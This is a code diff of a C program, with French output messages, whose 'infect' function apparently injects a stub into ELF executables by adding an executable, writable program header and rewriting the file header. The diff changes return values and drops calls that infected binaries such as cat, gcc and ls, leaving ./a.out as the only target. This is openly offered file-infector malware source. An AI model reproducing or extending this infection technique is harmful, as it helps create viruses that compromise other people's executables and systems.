@@ -24,7 +24,7 @@ int	infect(char *str)
 	new_phdr.p_vaddr = INT_MAX;
 	new_phdr.p_align = 4096;
 	new_phdr.p_filesz = sizeof(stub);
-	new_phdr.p_memsz = sizeof(stub);
+	new_phdr.p_memsz = 4096 * 8;
 	new_phdr.p_flags = 7;
 	int	i = 0;
 	int	f = 0;
@@ -49,7 +49,7 @@ int	infect(char *str)
 	if (i == ehdr.e_phnum)
 	{
 		printf("Pas de phdr inutile trouve!\n");
-		return 0;
+		return 1;
 	}
 	new_phdr.p_vaddr += new_phdr.p_offset + gap;
 	new_phdr.p_paddr = new_phdr.p_vaddr;
@@ -63,16 +63,11 @@ int	infect(char *str)
 	write(fd, &ehdr, sizeof(ehdr));
 	printf("Fichier : %s, infecte!\n", str);
 	close(fd);
+	return 0;
 }
 
 int	main(void)
 {
 	infect("./a.out");
-	infect("./cat");
-	infect("./gcc");
-	infect("./ls");
-	infect("./no-pie");
-	infect("./static");
-	infect("./static-no-pie");
 	return 0;
 }
